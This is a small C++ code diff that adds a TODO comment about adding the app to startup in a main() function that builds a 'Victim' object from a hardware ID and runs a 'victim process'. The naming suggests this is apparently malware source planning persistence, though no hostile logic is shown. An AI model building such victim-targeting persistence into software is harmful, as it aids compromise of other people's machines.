@@ -118,5 +118,7 @@ static std::string getHardwareId() {
 int main() {
     Victim victim(getHardwareId());
 
+    //TODO: add app to startup
+
     return victim.runVictimProcess();
 }
